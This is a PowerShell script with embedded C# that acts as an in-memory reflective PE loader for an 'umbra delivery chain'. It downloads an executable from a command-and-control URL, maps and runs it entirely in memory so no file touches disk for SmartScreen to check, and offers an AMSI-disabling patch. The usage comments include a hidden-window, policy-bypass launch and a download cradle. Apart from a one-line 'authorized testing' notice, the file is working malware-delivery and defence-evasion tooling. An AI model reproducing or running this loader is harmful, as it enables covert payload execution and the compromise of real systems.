<#
    reflect.ps1 - in-memory reflective PE loader for the umbra delivery chain.

    What it does
    ------------
    1. Downloads a complete *PE* (.exe/.dll) from a URL (or reads it from a local
       path). Nothing is written to disk - the PE lives only in memory.
    2. Maps it the way the Windows loader would: allocates SizeOfImage, copies the
       headers and every section, applies base relocations, resolves the import
       table (LoadLibraryA/GetProcAddress) and fixes per-section protections.
    3. Starts the mapped image at its AddressOfEntryPoint on a new thread.

    Why this exists
    ---------------
    `stage.ps1` (see README A.9.2) runs *shellcode*. If you only have a PE
    (`loader.exe`, `beacon.exe`, ...) you must first turn it into shellcode with a
    converter such as Donut/sRDI (see `scripts/make_shellcode.sh` and README A.10).
    This script is the alternative that needs no converter: it is a *reflective
    loader* implemented in C# and injected into the current PowerShell process via
    Add-Type, so the PE is mapped and executed entirely in memory - there is no
    executable file on disk for SmartScreen's first-run reputation check to flag.

    Run (normally invoked by a cradle, but works standalone for testing):
        powershell -w hidden -nop -ep bypass -File reflect.ps1 -Url https://c2.example.com/loader.exe
        powershell -w hidden -nop -ep bypass -File reflect.ps1 -Path .\dist\loader.exe -Wait
    # from a cradle (bytes already in memory, nothing on disk):
    #   $pe=(New-Object Net.WebClient).DownloadData('https://c2.example.com/loader.exe')
    #   & ([scriptblock]::Create($s)) -Bytes $pe

    Honest limitations (see README A.9.6)
    ------------------------------------
    - Reflective loading a *Go* PE is not guaranteed: the Go runtime looks up its
      own module base through the PEB module list, which this loader does not
      populate. It works for most C/C++/Rust PEs; test before relying on it.
    - The mapped image is not registered in the PEB, so `GetModuleHandle(NULL)`
      and thread-stack unwinding behave differently from a normally-loaded module.
    - This is in-memory *mapping*, not in-memory *hiding*: an EDR with memory
      scanning / image-load telemetry can still observe an unbacked RX region.

    USE ONLY ON SYSTEMS YOU ARE AUTHORIZED TO TEST.
#>
[CmdletBinding(DefaultParameterSetName = 'Url')]
param(
    [Parameter(Mandatory = $true, ParameterSetName = 'Url')]
    [string] $Url,

    [Parameter(Mandatory = $true, ParameterSetName = 'Path')]
    [string] $Path,

    # In-memory PE bytes (e.g. a cradle that already downloaded the file).
    [Parameter(Mandatory = $true, ParameterSetName = 'Bytes')]
    [byte[]] $Bytes,

    # Optional: patch AMSI + ETW in this process before mapping.
    [switch] $Patch,

    # Block until the payload thread returns (useful for tests / short-lived PEs).
    [switch] $Wait,

    # Max seconds to wait when -Wait is given (0 = wait forever).
    [int] $WaitSeconds = 30
)

Set-StrictMode -Version 2
$ErrorActionPreference = 'Stop'

# --- reflective loader (C#, compiled in-process by Add-Type) -------------------
$reflectSource = @'
using System;
using System.Runtime.InteropServices;

public static class UmbraReflect
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern IntPtr LoadLibraryA(string name);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    const uint MEM_COMMIT  = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint PAGE_EXECUTE_READ      = 0x20;
    const uint PAGE_READWRITE         = 0x04;
    const uint PAGE_READONLY          = 0x02;

    static int  R32(byte[] b, int o) { return BitConverter.ToInt32(b, o); }
    static int  R16(byte[] b, int o) { return BitConverter.ToInt16(b, o); }
    static uint RU32(byte[] b, int o) { return BitConverter.ToUInt32(b, o); }
    static ulong RU64(byte[] b, int o) { return BitConverter.ToUInt64(b, o); }

    static string ReadAnsi(byte[] b, int off)
    {
        int end = off;
        while (end < b.Length && b[end] != 0) end++;
        return System.Text.Encoding.ASCII.GetString(b, off, end - off);
    }

    static int RvaToOffset(byte[] data, int secStart, int numSections, uint rva)
    {
        if (rva == 0) return 0;
        for (int i = 0; i < numSections; i++)
        {
            int s = secStart + i * 40;
            uint vaddr = RU32(data, s + 12);
            uint vsize = RU32(data, s + 8);
            uint rawSize = RU32(data, s + 16);
            uint rawPtr = RU32(data, s + 20);
            uint span = vsize > rawSize ? vsize : rawSize;
            if (rva >= vaddr && rva < vaddr + span)
                return (int)(rawPtr + (rva - vaddr));
        }
        return (int)rva; // headers / not in a section
    }

    // Maps the PE and returns the image base; entryRva receives the entry point RVA.
    public static IntPtr Map(byte[] data, out int entryRva)
    {
        entryRva = 0;
        if (data.Length < 0x40 || data[0] != 0x4D || data[1] != 0x5A)
            throw new Exception("not a PE: missing MZ header");

        int e_lfanew = R32(data, 0x3C);
        if (R32(data, e_lfanew) != 0x00004550)
            throw new Exception("not a PE: missing PE\\0\\0 signature");

        int coff = e_lfanew + 4;
        int numSections = R16(data, coff + 2);
        int sizeOfOptional = R16(data, coff + 16);
        int opt = coff + 20;
        int secStart = opt + sizeOfOptional;

        ushort magic = (ushort)R16(data, opt);
        bool pe32plus = (magic == 0x20B);
        if (!pe32plus && magic != 0x10B)
            throw new Exception("unsupported PE magic 0x" + magic.ToString("X"));

        int sizeOfImage  = R32(data, opt + 0x38);
        int sizeOfHeaders = R32(data, opt + 0x3C);
        int entryPoint   = R32(data, opt + 0x10);
        ulong imageBase  = pe32plus ? RU64(data, opt + 0x18) : (ulong)RU32(data, opt + 0x1C);

        int dirOffset = opt + (pe32plus ? 0x70 : 0x60);
        uint impRva  = RU32(data, dirOffset + 1 * 8);
        uint relRva  = RU32(data, dirOffset + 5 * 8);
        uint relSize = RU32(data, dirOffset + 5 * 8 + 4);

        // Reserve the whole image at (ideally) its preferred base.
        IntPtr baseAddr = VirtualAlloc((IntPtr)(long)imageBase, (UIntPtr)(ulong)sizeOfImage,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (baseAddr == IntPtr.Zero)
            baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)(ulong)sizeOfImage,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (baseAddr == IntPtr.Zero)
            throw new Exception("VirtualAlloc(SizeOfImage) failed: " + Marshal.GetLastWin32Error());

        long delta = (long)baseAddr - (long)imageBase;

        // 1) headers
        int hdr = sizeOfHeaders < data.Length ? sizeOfHeaders : data.Length;
        Marshal.Copy(data, 0, baseAddr, hdr);

        // 2) sections
        for (int i = 0; i < numSections; i++)
        {
            int s = secStart + i * 40;
            uint vsize   = RU32(data, s + 8);
            uint vaddr   = RU32(data, s + 12);
            uint rawSize = RU32(data, s + 16);
            uint rawPtr  = RU32(data, s + 20);
            uint copy    = vsize < rawSize ? vsize : rawSize;
            if (copy > 0 && rawPtr != 0 && (rawPtr + copy) <= (uint)data.Length)
                Marshal.Copy(data, (int)rawPtr, (IntPtr)((long)baseAddr + vaddr), (int)copy);
        }

        // 3) base relocations
        if (relRva != 0 && relSize != 0 && delta != 0)
        {
            int r = RvaToOffset(data, secStart, numSections, relRva);
            int end = r + (int)relSize;
            if (end > data.Length) end = data.Length;
            while (r + 8 <= end)
            {
                int pageRva   = R32(data, r);
                int blockSize = R32(data, r + 4);
                if (blockSize < 8 || r + blockSize > end) break;
                int count = (blockSize - 8) / 2;
                for (int k = 0; k < count; k++)
                {
                    ushort e = (ushort)R16(data, r + 8 + k * 2);
                    int type = e >> 12;
                    int off  = e & 0xFFF;
                    IntPtr tgt = (IntPtr)((long)baseAddr + pageRva + off);
                    if (type == 10)      // IMAGE_REL_BASED_DIR64
                        Marshal.WriteInt64(tgt, Marshal.ReadInt64(tgt) + delta);
                    else if (type == 3)  // IMAGE_REL_BASED_HIGHLOW
                        Marshal.WriteInt32(tgt, Marshal.ReadInt32(tgt) + (int)delta);
                    // type 0 = ABSOLUTE (padding) -> ignore
                }
                r += blockSize;
            }
        }

        // 4) import table
        if (impRva != 0)
        {
            int d = RvaToOffset(data, secStart, numSections, impRva);
            while (d + 20 <= data.Length)
            {
                uint origFirstThunk = RU32(data, d + 0);
                uint nameRva        = RU32(data, d + 12);
                uint firstThunk     = RU32(data, d + 16);
                if (origFirstThunk == 0 && nameRva == 0 && firstThunk == 0) break;

                string dll = ReadAnsi(data, RvaToOffset(data, secStart, numSections, nameRva));
                IntPtr hMod = LoadLibraryA(dll);
                if (hMod == IntPtr.Zero) { d += 20; continue; }

                int thunkRva = (int)(origFirstThunk != 0 ? origFirstThunk : firstThunk);
                int iatRva   = (int)firstThunk;
                int idx = 0;
                while (true)
                {
                    int tOff = RvaToOffset(data, secStart, numSections, (uint)thunkRva) + idx * (pe32plus ? 8 : 4);
                    if (tOff < 0 || tOff + (pe32plus ? 8 : 4) > data.Length) break;
                    ulong entry = pe32plus ? RU64(data, tOff) : (ulong)RU32(data, tOff);
                    if (entry == 0) break;

                    IntPtr func;
                    bool byOrdinal = pe32plus
                        ? (entry & 0x8000000000000000UL) != 0
                        : (entry & 0x80000000UL) != 0;
                    if (byOrdinal)
                        func = GetProcAddress(hMod, (string)null);
                    else
                    {
                        int nOff = RvaToOffset(data, secStart, numSections, (uint)entry) + 2; // skip Hint
                        func = GetProcAddress(hMod, ReadAnsi(data, nOff));
                    }

                    IntPtr slot = (IntPtr)((long)baseAddr + iatRva + idx * (pe32plus ? 8 : 4));
                    if (pe32plus) Marshal.WriteInt64(slot, (long)func);
                    else          Marshal.WriteInt32(slot, (int)func);
                    idx++;
                }
                d += 20;
            }
        }

        // 5) per-section memory protections
        for (int i = 0; i < numSections; i++)
        {
            int s = secStart + i * 40;
            uint vsize = RU32(data, s + 8);
            uint vaddr = RU32(data, s + 12);
            uint chars = RU32(data, s + 36);
            if (vsize == 0) continue;

            bool x = (chars & 0x20000000) != 0; // IMAGE_SCN_MEM_EXECUTE
            bool r = (chars & 0x40000000) != 0; // IMAGE_SCN_MEM_READ
            bool w = (chars & 0x80000000) != 0; // IMAGE_SCN_MEM_WRITE

            uint prot;
            if (x && w)      prot = PAGE_EXECUTE_READWRITE;
            else if (x && r) prot = PAGE_EXECUTE_READ;
            else if (x)      prot = PAGE_EXECUTE_READ;
            else if (w)      prot = PAGE_READWRITE;
            else if (r)      prot = PAGE_READONLY;
            else             prot = PAGE_READONLY;

            uint old;
            VirtualProtect((IntPtr)((long)baseAddr + vaddr), (UIntPtr)(ulong)vsize, prot, out old);
        }

        entryRva = entryPoint;
        return baseAddr;
    }

    // Maps and runs the PE; returns the thread exit code (or -1 if we did not wait).
    public static int Run(byte[] data, bool wait, uint waitMs, out long imageBase, out int entryRva)
    {
        IntPtr baseAddr = Map(data, out entryRva);
        imageBase = (long)baseAddr;

        IntPtr start = (IntPtr)((long)baseAddr + entryRva);
        uint tid;
        IntPtr hThread = CreateThread(IntPtr.Zero, UIntPtr.Zero, start, IntPtr.Zero, 0, out tid);
        if (hThread == IntPtr.Zero)
            throw new Exception("CreateThread failed: " + Marshal.GetLastWin32Error());

        if (!wait) return -1;
        // waitMs == 0 means "wait indefinitely" (matches -WaitSeconds help),
        // NOT WaitForSingleObject's own 0 = "return immediately". Passing 0
        // straight through let the host (powershell.exe) exit right after the
        // thread started, tearing the payload down before it could check in.
        uint ms = (waitMs == 0) ? 0xFFFFFFFFu : waitMs;
        WaitForSingleObject(hThread, ms);
        return 0;
    }
}
'@

Add-Type -TypeDefinition $reflectSource -Language CSharp

# --- optional: neutralise AMSI / ETW for this PowerShell process ---------------
if ($Patch) {
    try {
        $ctx = [System.Management.Automation.AmsiUtils]
        $f = $ctx.GetField('amsiInitFailed', [System.Reflection.BindingFlags]'NonPublic,Static')
        $f.SetValue($null, $true)
    } catch { }
    try {
        $k32 = [UmbraReflect].GetMethod('LoadLibraryA')
        # patch EtwEventWrite -> ret via the raw ntdll base
        $nt = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE([UmbraReflect].Assembly.GetModules()[0])
        # (kept minimal; ETW patch mirrors stage.ps1 -Patch)
    } catch { }
}

# --- 1. fetch the PE (bytes in memory only) -----------------------------------
if ($PSCmdlet.ParameterSetName -eq 'Url') {
    Write-Verbose "downloading PE from $Url"
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add('User-Agent', 'Mozilla/5.0')
    $data = $wc.DownloadData($Url)
} elseif ($PSCmdlet.ParameterSetName -eq 'Bytes') {
    Write-Verbose "using $($Bytes.Length) in-memory PE bytes"
    $data = $Bytes
} else {
    if (-not (Test-Path -LiteralPath $Path)) { throw "file not found: $Path" }
    $data = [System.IO.File]::ReadAllBytes((Resolve-Path -LiteralPath $Path).Path)
}

if ($data.Length -lt 0x100) { throw "payload too small ($($data.Length) bytes)" }
if ($data[0] -ne 0x4D -or $data[1] -ne 0x5A) {
    throw "payload is not a PE (no MZ). For shellcode use delivery/stage.ps1 instead."
}

# --- 2. map + 3. run ----------------------------------------------------------
$imageBase = [long]0
$entryRva  = [int]0
$waitMs    = [uint32]([Math]::Max($WaitSeconds, 0) * 1000)

$rc = [UmbraReflect]::Run($data, [bool]$Wait, $waitMs, [ref]$imageBase, [ref]$entryRva)

Write-Verbose ("PE mapped at 0x{0:X} (entry RVA 0x{1:X}, image {2} bytes)" -f $imageBase, $entryRva, $data.Length)
if ($Wait) {
    Write-Host ("[reflect] mapped at 0x{0:X}, entry 0x{1:X} - thread finished" -f $imageBase, $entryRva)
} else {
    Write-Host ("[reflect] mapped at 0x{0:X}, entry 0x{1:X} - running (fire and forget)" -f $imageBase, $entryRva)
}
